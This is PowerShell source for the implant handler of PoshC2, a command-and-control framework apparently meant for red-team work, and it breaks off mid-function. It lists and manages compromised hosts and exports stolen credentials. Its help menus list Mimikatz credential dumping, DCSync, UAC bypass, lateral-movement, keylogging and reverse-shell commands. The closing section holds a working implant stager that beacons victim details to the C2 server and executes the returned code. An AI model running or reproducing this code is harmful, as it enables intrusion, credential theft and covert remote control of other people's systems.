<#
        .Synopsis
        Implant-Handler cmdlet for the PowershellC2 to manage and deliver commands
        .DESCRIPTION
        Implant-Handler cmdlet for the PowershellC2 to manage and deliver commands
        .EXAMPLE
        ImplantHandler -FolderPath C:\Temp\PoshC2-031120161055
#>
function Implant-Handler
{
    [CmdletBinding(DefaultParameterSetName = "FolderPath")]
    Param
    (
        [Parameter(ParameterSetName = "FolderPath", Mandatory = $false)]
        [string]
        $FolderPath,
        [string]
        $PoshPath
    )

    if (!$FolderPath) {
        $FolderPath = Read-Host -Prompt `n'Enter the root folder path of the Database/Project'
    }

    # initiate defaults
    $Database = "$FolderPath\PowershellC2.SQLite"
    $p = $env:PsModulePath
    $p += ";$PoshPath\"
    $global:randomuri = $null
    $global:cmdlineinput = 'PS >'
    $global:implants = $null
    $global:implantid = $null
    $global:command = $null
    [Environment]::SetEnvironmentVariable("PSModulePath",$p)
    Import-Module -Name PSSQLite
    Import-Module "$PoshPath\Modules\ConvertTo-Shellcode.ps1"

    $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
    $defaultbeacon = $c2serverresults.DefaultSleep
    $killdatefm = $c2serverresults.KillDate
    $IPAddress = $c2serverresults.HostnameIP 
    $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
    $ipv4address = $c2serverresults.HostnameIP
    $serverport = $c2serverresults.ServerPort 
        
$head = '
<style>

body {
font-family: Verdana, Geneva, Arial, Helvetica, sans-serif;
}

table {
    table-layout: fixed;
    word-wrap: break-word;
    display: table;
    font-family: monospace;
    white-space: pre;
    margin: 1em 0;
}

th, td {
    text-align: left;
    padding: 8px;
}

tr:nth-child(even){background-color: #f2f2f2}

th {
    background-color: #4CAF50;
    color: white;
}
 
p { 
margin-left: 20px; 
font-size: 12px; 
}
 
</style>'

$header = '
<pre>
  __________            .__.     _________  ________  
  \_______  \____  _____|  |__   \_   ___ \ \_____  \ 
   |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ 
   |    |  (  <_> )___ \|   Y  \ \     \____/       \ 
   |____|   \____/____  >___|  /  \______  /\_______ \
                      \/     \/          \/         \/
  ============ @benpturner & @davehardy20 ============
  ====================================================
</pre>'


    function startup 
    {
        Clear-Host
        $global:implants = $null
        $global:command = $null
        $global:randomuri = $null
        $global:implantid = $null
        $dbresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE Alive='Yes'" -As PSObject
        $global:implants = $dbresults.RandomURI

        # while no implant is selected
        while ($global:randomuri -eq $null)
        {
            Clear-Host
            Write-Host -Object ""
            Write-Host -Object ".___.              .__.                __          " -ForegroundColor Green
            Write-Host -Object "|   | _____ ______ |  | _____    _____/  |_  ______" -ForegroundColor Green
            Write-Host -Object "|   |/     \\____ \|  | \__  \  /    \   __\/  ___/" -ForegroundColor Green
            Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
            Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
            Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
            Write-Host "============== v2.9 www.PoshC2.co.uk ==============" -ForegroundColor Green
            Write-Host "===================================================" `n -ForegroundColor Green

            foreach ($implant in $dbresults) 
            { 
                $randomurihost = $implant.RandomURI
                $implantid = $implant.ImplantID
                $im_arch = $implant.Arch
                $im_user = $implant.User
                $im_hostname = $implant.Hostname
                $im_lastseen = $implant.LastSeen
                $im_pid = $implant.PID
                $im_sleep = $implant.Sleep
                $im_domain = $implant.Domain
                if ($randomurihost) {
                    if (((get-date).AddMinutes(-10) -gt $implant.LastSeen) -and ((get-date).AddMinutes(-59) -lt $implant.LastSeen)){
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Yellow
                    }
                    elseif ((get-date).AddMinutes(-59) -gt $implant.LastSeen){
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Red
                    }
                    else {
                        Write-Host "[$implantid]: Seen:$im_lastseen | PID:$im_pid | Sleep:$im_sleep | $im_domain @ $im_hostname ($im_arch)" -ForegroundColor Green
                    } 
                }
            }

            if (($HelpOutput) -and ($HelpOutput -eq "PrintMainHelp")){
                print-mainhelp
                $HelpOutput = $Null
            } 

            if (($HelpOutput) -and ($HelpOutput -ne "PrintMainHelp")){
                Write-Host ""
                Write-Host $HelpOutput -ForegroundColor Green
                $HelpOutput = $Null
            }

            $global:implantid = Read-Host -Prompt `n'Select ImplantID or ALL or Comma Separated List (Enter to refresh):'
            Write-Host -Object ""
            if (!$global:implantid) 
            {
                startup
            }
            if ($global:implantid -eq "Help"){
               $HelpOutput = "PrintMainHelp"
               startup
            }
            elseif ($global:implantid -eq "?"){
               $HelpOutput = "PrintMainHelp"
               startup
            }
            elseif ($global:implantid.ToLower().StartsWith("set-defaultbeacon")) 
            {
                [int]$Beacon = $global:implantid -replace "set-defaultbeacon ",""                                
                $HelpOutput = "DefaultBeacon updated to: $Beacon" 
                Invoke-SqliteQuery -DataSource $Database -Query "UPDATE C2Server SET DefaultSleep='$Beacon'"|Out-Null
                startup
            }
            elseif ($global:implantid -eq "automigrate-frompowershell")
            {
                $taskn = "LoadModule NamedPipe.ps1"
                $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
                $taskm = "AutoMigrate"
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskn
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskp
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskm
                }
                $HelpOutput = "Added automigrate-frompowershell"
                startup      
            }
            elseif ($global:implantid -eq "AM")
            {
                $taskn = "LoadModule NamedPipe.ps1"
                $taskp = "LoadModule Invoke-ReflectivePEInjection.ps1"
                $taskm = "AutoMigrate"
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskn
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskp
                }
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $taskm
                }
                $HelpOutput = "Added automigrate-frompowershell"
                startup      
            }
            elseif ($global:implantid -eq "L") 
            {
                $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                foreach ($i in $autorunlist) {
                    $taskid = $i.TaskID
                    $taskname = $i.Task
                    $HelpOutput += "TaskID: $taskid | Task: $taskname `n"
                }             
                startup
            }
            elseif ($global:implantid -eq "list-autorun") 
            {
                $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                foreach ($i in $autorunlist) {
                    $taskid = $i.TaskID
                    $taskname = $i.Task
                    $HelpOutput += "TaskID: $taskid | Task: $taskname `n"
                }             
                startup
            }
            elseif ($global:implantid -eq "nuke-autorun") 
            {
                Invoke-SqliteQuery -DataSource $Database -Query "Drop Table AutoRuns"
                
                $Query = 'CREATE TABLE AutoRuns (
                TaskID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
                Task TEXT)'
                Invoke-SqliteQuery -Query $Query -DataSource $Database 
                startup
            }
            elseif ($global:implantid.ToLower().StartsWith("del-autorun")) 
            {
                $number = $global:implantid.Substring(12)
                $number = [int]$number
                if ($number  -match '^\d+$'){
                    Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM AutoRuns where TaskID='$number'"

                    $autorunlist = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM AutoRuns" -As PSObject
                    foreach ($i in $autorunlist) {
                        $taskid = $i.TaskID
                        $taskname = $i.Task
                        $HelpOutput += "TaskID: $taskid | Task: $taskname"
                    }
                
                    startup    
                }
                else
                {  
                    $HelpOutput = "Error not an integer"
                    startup
                }
            }
            elseif ($global:implantid.ToLower().StartsWith("add-autorun")) 
            {
                $tasker = $global:implantid.Substring(12)
                write-host "$tasker" -ForegroundColor Cyan
                $Query = 'INSERT
                INTO AutoRuns (Task)
                VALUES (@Task)'
                
                Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                Task = $tasker
                }
                $HelpOutput = "Added autorun $tasker"
                startup                
            } elseif ($global:implantid.ToLower().StartsWith("output-to-html"))
            {
                $allcreds = Invoke-SqliteQuery -Datasource $Database -Query "SELECT * FROM Creds" -As PSObject
                $CredsArray = @()
                foreach ($cred in $allcreds) {
                    $CredLog = New-object PSObject | Select  CredsID, Username, Password, Hash
                    $CredLog.CredsID = $cred.CredsID;
                    $Credlog.Username = $cred.Username;
                    $CredLog.Password = $cred.Password;
                    $CredLog.Hash = $cred.Hash;
                    $CredsArray += $CredLog
                }
                $CredsArray | ConvertTo-Html -title "<title>Credential List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Creds.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants" -As PSObject
               $ImplantsArray = @()
               foreach ($implantres in $allresults) {                  
                    $ImplantLog = New-Object PSObject | Select ImplantID, RandomURI, User, Hostname, IPAddress, FirstSeen, LastSeen, PID, Arch, Domain, Sleep
                    $ImplantLog.ImplantID = $implantres.ImplantID;
                    $ImplantLog.RandomURI = $implantres.RandomURI;
                    $ImplantLog.User = $implantres.User;
                    $ImplantLog.Hostname = $implantres.Hostname;
                    $ImplantLog.IPAddress = $implantres.IPAddress;
                    $ImplantLog.FirstSeen = $implantres.FirstSeen;
                    $ImplantLog.LastSeen = $implantres.LastSeen;
                    $ImplantLog.PID = $implantres.PID;
                    $ImplantLog.Arch = $implantres.Arch;
                    $ImplantLog.Domain = $implantres.Domain;
                    $ImplantLog.Sleep = $implantres.Sleep;
                    $ImplantsArray += $ImplantLog
               }

               $ImplantsArray | ConvertTo-Html -title "<title>Implant List from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\Implants.html"

               $allresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks" -As PSObject
               $TasksArray = @()
               foreach ($task in $allresults) {                  
                    $ImplantTask = New-Object PSObject | Select TaskID, Timestamp, RandomURI, Command, Output
                    $ImplantTask.TaskID = $task.CompletedTaskID;
                    $ImplantTask.Timestamp = $task.TaskID;
                    $ImplantTask.RandomURI = $task.RandomURI;
                    $ImplantTask.Command = $task.Command;
                    $ImplantTask.Output = $task.Output;
                    $TasksArray += $ImplantTask
               }
               $TasksArray | ConvertTo-Html -title "<title>Tasks from PoshC2</title>" -Head $head -pre $header -post "<h3>For details, contact X<br>Created by X</h3>" | Out-File "$FolderPath\reports\ImplantTasks.html"
            } elseif ($global:implantid -eq "P")
            {
                start-process $FolderPath\payloads\payload.bat
                $HelpOutput = "Pwning self......"
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("pwnself"))
            {
                start-process $FolderPath\payloads\payload.bat
                $HelpOutput = "Pwning self......"
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("show-serverinfo"))
            {
                $HelpOutput  = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("createproxypayload")) 
            {
                $HelpOutput = IEX $global:implantid
                $HelpOutput
            } elseif ($global:implantid.ToLower().StartsWith("listmodules")) 
            {
                Write-Host -Object "Reading modules from `$env:PSModulePath\* and $PoshPath\Modules\*"
                $folders = $env:PSModulePath -split ";" 
                foreach ($item in $folders) {
                    $PSmod = Get-ChildItem -Path $item -Include *.ps1 -Name
                    foreach ($mod in $PSmod)
                    {
                        $HelpOutput += $mod + "`n"
                    }
                }
                $listmodules = Get-ChildItem -Path "$PoshPath\Modules" -Name 
                foreach ($mod in $listmodules)
                {
                  $HelpOutput += $mod + "`n"
                }
                
                $HelpOutput
            }  
            elseif ($global:implantid.Contains(","))
            {
                $global:cmdlineinput = "PS $global:implantid>"
                break 
            } elseif ($global:implantid -eq "ALL") 
            {
                $global:cmdlineinput = "PS $global:implantid>"
                break
            } else 
            {
                $global:randomuri = Invoke-SqliteQuery -DataSource $Database -Query "SELECT RandomURI FROM Implants WHERE ImplantID='$global:implantid'" -as SingleValue
                $global:cmdlineinput = "PS $global:implantid>"   
            }
        }
    }

    $tick = "'"
    $speechmarks = '"'

     function print-mainhelp {
        write-host `n "Main Menu: " -ForegroundColor Green
        write-host "================================" -ForegroundColor Red
        write-host " Use Implant by <id>, e.g. 1"-ForegroundColor Green
        write-host " Use Multiple Implants by <id>,<id>,<id>, e.g. 1,2,5"-ForegroundColor Green
        write-host " Use ALL Implants by ALL" -ForegroundColor Green
        write-host `n "Auto-Runs: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Add-autorun <task>"-ForegroundColor Green
        write-host " List-autorun (Alias: L)"-ForegroundColor Green
        write-host " Del-autorun <taskID>"-ForegroundColor Green
        write-host " Nuke-autorun"-ForegroundColor Green
        write-host " Automigrate-FromPowershell (Alias: AM)"-ForegroundColor Green
        write-host `n "Server Commands: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Show-ServerInfo" -ForegroundColor Green 
        write-host " Output-To-HTML"-ForegroundColor Green
        write-host " Set-DefaultBeacon 60"-ForegroundColor Green
        write-host " ListModules " -ForegroundColor Green
        write-host " PwnSelf (Alias: P)" -ForegroundColor Green
        write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green  
    }

    function print-help {
        write-host `n "Implant Features: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Beacon 60s / Beacon 10m / Beacon 2h"-ForegroundColor Green 
        write-host " Turtle 60s / Tutle 30m / Turtle 8h "-ForegroundColor Green 
        write-host " Kill-Implant"-ForegroundColor Green 
        write-host " Hide-Implant"-ForegroundColor Green 
        write-host " Unhide-Implant"-ForegroundColor Green 
        write-host " Output-To-HTML"-ForegroundColor Green 
        write-host " Invoke-Enum"-ForegroundColor Green 
        write-host " Get-Proxy"-ForegroundColor Green 
        write-host " Get-ComputerInfo"-ForegroundColor Green 
        write-host " Add-Creds -Username <Username> -Password <Pass> -Hash <Hash>"-ForegroundColor Green 
        write-host " Dump-Creds"-ForegroundColor Green 
        write-host " Unzip <source file> <destination folder>"-ForegroundColor Green 
        write-host " Get-System" -ForegroundColor Green
        write-host " Get-System-WithProxy" -ForegroundColor Green 
        write-host " Get-ImplantWorkingDirectory"-ForegroundColor Green
        write-host " Get-Pid" -ForegroundColor Green 
        write-host " Get-Webpage http://intranet" -ForegroundColor Green 
        write-host " ListModules " -ForegroundColor Green
        write-host " ModulesLoaded " -ForegroundColor Green 
        write-host " LoadModule <modulename>" -ForegroundColor Green 
        write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
        write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
        write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
        write-host " StartAnotherImplantWithProxy or SAIWP" -ForegroundColor Green 
        write-host " Invoke-DaisyChain -port 80 -daisyserver http://192.168.1.1 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass" -ForegroundColor Green
        write-host " CreateProxyPayload -user <dom\user> -pass <pass> -proxyurl <http://10.0.0.1:8080>" -ForegroundColor Green
        write-host " Get-MSHotfixes" -ForegroundColor Green 
        write-host " Get-FireWallRulesAll | Out-String -Width 200" -ForegroundColor Green 
        write-host " EnableRDP" -ForegroundColor Green
        write-host " DisableRDP" -ForegroundColor Green
        write-host " Netsh.exe advfirewall firewall add rule name=`"EnableRDP`" dir=in action=allow protocol=TCP localport=any enable=yes" -ForegroundColor Green
        write-host " Get-WLANPass" -ForegroundColor Green
        write-host " Get-WmiObject -Class Win32_Product" -ForegroundColor Green
        write-host " Get-CreditCardData -Path 'C:\Backup\'" -ForegroundColor Green
        write-host `n "Privilege Escalation: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Invoke-AllChecks" -ForegroundColor Green
        write-host " Invoke-UACBypass" -ForegroundColor Green
        write-host " Invoke-UACBypassProxy" -ForegroundColor Green
        Write-Host ' Get-MSHotFixes | Where-Object {$_.hotfixid -eq "KB2852386"}' -ForegroundColor Green
        write-host " Invoke-MS16-032" -ForegroundColor Green 
        write-host " Invoke-MS16-032-ProxyPayload" -ForegroundColor Green 
        write-host " Get-GPPPassword" -ForegroundColor Green 
        write-host " Get-Content 'C:\ProgramData\McAfee\Common Framework\SiteList.xml'" -ForegroundColor Green
        write-host " Dir -Recurse | Select-String -pattern 'password='" -ForegroundColor Green
        write-host `n "File Management: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Download-File -Source 'C:\Temp Dir\Run.exe'" -ForegroundColor Green
        write-host " Download-Files -Directory 'C:\Temp Dir\'" -ForegroundColor Green
        write-host " Upload-File -Source 'C:\Temp\Run.exe' -Destination 'C:\Temp\Test.exe'" -ForegroundColor Green  
        write-host " Web-Upload-File -From 'http://www.example.com/App.exe' -To 'C:\Temp\App.exe' " -ForegroundColor Green 
        write-host `n "Persistence: " -ForegroundColor Green
        write-host "================" -ForegroundColor Red
        write-host " Install-Persistence 1,2,3 " -ForegroundColor Green 
        write-host " Remove-Persistence 1,2,3" -ForegroundColor Green 
        write-host " Install-ServiceLevel-Persistence | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
        write-host " Install-ServiceLevel-PersistenceWithProxy | Remove-ServiceLevel-Persistence" -ForegroundColor Green 
        write-host `n "Network Tasks / Lateral Movement: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host " Get-ExternalIP" -ForegroundColor Green
        write-host " Test-ADCredential -Domain test -User ben -Password Password1" -ForegroundColor Green 
        write-host " Invoke-SMBLogin -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Password" -ForegroundColor Green
        write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
        write-host " Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash/-Pass -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
        write-host " Net View | Net Users | Whoami /groups | Net localgroup administrators | Net Accounts /dom" -ForegroundColor Green  
        write-host ' Get-NetUser -Filter | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
        write-host ' Get-NetUser -Filter samaccountname=test' -ForegroundColor Green 
        write-host ' Get-NetUser -Filter userprinciplename=test@test.com' -ForegroundColor Green 
        write-host ' Get-NetGroup -GroupName "Domain Admins" | %{ Get-NetUser $_.membername } | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname' -ForegroundColor Green 
        write-host ' Get-DomainGroupMember -Recurse "Domain Admins" | Select MemberName' -ForegroundColor Green
        write-host `n "Domain Trusts: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host " Get-NetDomain | Get-NetDomainController | Get-NetForestDomain" -ForegroundColor Green 
        write-host " Invoke-MapDomainTrust" -ForegroundColor Green 
        write-host ' Get-NetUser -domain child.parent.com -Filter samaccountname=test' -ForegroundColor Green 
        write-host ' Get-NetGroup -domain child.parent.com | select samaccountname' -ForegroundColor Green 
        write-host `n "Other Network Tasks: " -ForegroundColor Green
        write-host "==================" -ForegroundColor Red
        write-host ' Get-NetComputer | Select-String -pattern "Citrix" ' -ForegroundColor Green 
        write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
        write-host " Get-BloodHoundData -CollectionMethod 'Stealth' | Export-BloodHoundCSV" -ForegroundColor Green
        write-host " Get-NetDomainController | Select name | get-netsession | select *username,*CName" -ForegroundColor Green
        write-host " Get-DFSshare | get-netsession | Select *username,*CName" -ForegroundColor Green
        write-host " Get-NetFileServer | get-netsession | Select *username,*CName" -ForegroundColor Green
        write-host " Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash" -ForegroundColor Green
        write-host " Get-DomainComputer -LDAPFilter `"(|(operatingsystem=*7*)(operatingsystem=*2008*))`" -SPN `"wsman*`" -Properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl" -ForegroundColor Green
        write-host " Write-SCFFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
        write-host " Write-INIFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
        write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
        write-host " Invoke-Hostscan -IPRangeCIDR 172.16.0.0/24 (Provides list of hosts with 445 open)" -ForegroundColor Green
        write-host " Invoke-ShareFinder -hostlist hosts.txt" -ForegroundColor Green
        write-host " Get-NetFileServer -Domain testdomain.com" -ForegroundColor Green
        write-host " Find-InterestingFile -Path \\SERVER\Share -OfficeDocs -LastAccessTime (Get-Date).AddDays(-7)" -ForegroundColor Green
        write-host " Brute-AD" -ForegroundColor Green 
        write-host " Brute-LocAdmin -Username administrator" -ForegroundColor Green 
        Write-Host " Get-PassPol" -ForegroundColor Green
        Write-Host " Get-PassNotExp" -ForegroundColor Green
        Write-Host " Get-LocAdm" -ForegroundColor Green
        Write-Host " Invoke-Pipekat -Target <ip-optional> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        Write-Host " Invoke-Inveigh -FileOutputDirectory C:\Temp\ -FileOutput Y -HTTP Y -Proxy Y -NBNS Y -Tool 1" -ForegroundColor Green
        Write-Host " Invoke-Sniffer -OutputFile C:\Temp\Output.txt -MaxSize 50MB -LocalIP 10.10.10.10" -ForegroundColor Green
        Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
        Write-Host " Invoke-RunAs -cmd 'powershell.exe' -args 'start-service -name WinRM' -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
        Write-Host " Invoke-RunAsPayload -Domain <dom> -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
        Write-Host " Invoke-RunAsProxyPayload -Domain <dom> -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
        write-host " Invoke-WMIExec -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional> -command <cmd>" -ForegroundColor Green
        write-host " Invoke-WMIPayload -Target <ip> -Domain <dom> -Username <user> -Password '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-PsExecPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-PsExecProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-WMIProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>" -ForegroundColor Green
        write-host " Invoke-WMIDaisyPayload -Target <ip> -Domain <dom> -user <user> -pass '<pass>'" -ForegroundColor Green
        #write-host " EnableWinRM | DisableWinRM -computer <dns/ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        write-host " Invoke-WinRMSession -IPAddress <ip> -user <dom\user> -pass <pass>" -ForegroundColor Green
        write-host `n "Credentials / Tokens / Local Hashes (Must be SYSTEM): " -ForegroundColor Green
        write-host "=========================================================" -ForegroundColor Red
        write-host " Invoke-Mimikatz | Out-String | Parse-Mimikatz" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::logonpasswords$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::sam$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::lsa$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::cache$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)ts::multirdp$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)privilege::debug$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)crypto::capi$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)crypto::certificates /export$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-Mimikatz -Computer 10.0.0.1 -Command $($tick)$($speechmarks)sekurlsa::pth /user:<user> /domain:<dom> /ntlm:<HASH> /run:c:\temp\run.bat$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-TokenManipulation | Select-Object Domain, Username, ProcessId, IsElevated, TokenType | ft -autosize | Out-String" -ForegroundColor Green
        write-host ' Invoke-TokenManipulation -ImpersonateUser -Username "Domain\User"' -ForegroundColor Green
        write-host `n "Credentials / Domain Controller Hashes: " -ForegroundColor Green
        write-host "============================================" -ForegroundColor Red
        write-host " Invoke-Mimikatz -Command $($tick)$($speechmarks)lsadump::dcsync /domain:domain.local /user:administrator$($speechmarks)$($tick)" -ForegroundColor Green
        write-host " Invoke-DCSync -PWDumpFormat" -ForegroundColor Green
        write-host " Dump-NTDS -EmptyFolder <emptyfolderpath>" -ForegroundColor Green
        write-host `n "Useful Modules: " -ForegroundColor Green
        write-host "====================" -ForegroundColor Red
        write-host " Show-ServerInfo" -ForegroundColor Green 
        write-host " Get-Screenshot" -ForegroundColor Green
        write-host " Get-ScreenshotMulti -Timedelay 120 -Quantity 30" -ForegroundColor Green
        write-host " Get-RecentFiles" -ForegroundColor Green
        write-host " Cred-Popper" -ForegroundColor Green 
        write-host " Hashdump" -ForegroundColor Green 
        write-host ' Get-Keystrokes -LogPath "$($Env:TEMP)\key.log"' -ForegroundColor Green
        write-host " Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25" -ForegroundColor Green
        write-host " Invoke-UserHunter -StopOnSuccess" -ForegroundColor Green
        write-host " Migrate-x64" -ForegroundColor Green
        write-host " Migrate-x64 -ProcID 4444" -ForegroundColor Green
        write-host " Migrate-x64 -NewProcess C:\Windows\System32\ConHost.exe" -ForegroundColor Green
        write-host " Migrate-x86 -ProcName lsass" -ForegroundColor Green
        write-host " Migrate-Proxypayload-x86 -ProcID 4444" -ForegroundColor Green
        write-host " Migrate-Proxypayload-x64 -ProcName notepad" -ForegroundColor Green
        write-host " Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 172.16.0.100 -Lport 443 -Force" -ForegroundColor Green
        write-host ' Get-Eventlog -newest 10000 -instanceid 4624 -logname security | select message -ExpandProperty message | select-string -pattern "user1|user2|user3"' -ForegroundColor Green
        write-host ' Send-MailMessage -to "itdept@test.com" -from "User01 <user01@example.com>" -subject <> -smtpServer <> -Attachment <>'-ForegroundColor Green
        write-host `n "Implant Handler: " -ForegroundColor Green
        write-host "=====================" -ForegroundColor Red
        write-host " Back" -ForegroundColor Green 
        write-host " Exit" `n -ForegroundColor Green 
    }

    # call back command
    $command = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
function Get-Webclient ($Cookie) {
$d = (Get-Date -Format "dd/MM/yyyy");
$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
$k = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null);
if ($k -lt $d) {exit} 
$wc = New-Object System.Net.WebClient; 
$wc.UseDefaultCredentials = $true; 
$wc.Proxy.Credentials = $wc.Credentials;
$h="'+$domainfrontheader+'"
if ($h) {$wc.Headers.Add("Host",$h)}
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
if ($cookie) {
$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
} $wc }
function primer {
if ($env:username -eq $env:computername+"$"){$u="SYSTEM"}else{$u=$env:username}
$pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
$p64 = [Convert]::ToBase64String($pre)
$pm = (Get-Webclient -Cookie $p64).downloadstring("'+$ipv4address+":"+$serverport+'/connect")
$pm = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pm))
$pm } 
$pm = primer
if ($pm) {$pm| iex} else {
start-sleep 10
primer | iex }'

        function Get-RandomURI 
    {
        param (
            [int]$Length
        )
        $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
        $result = ''
        for ($x = 0; $x -lt $Length; $x++) 
        {
            $result += $set | Get-Random
        }
        return $result
    }

    # create payloads
    function CreatePayload 
    {
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
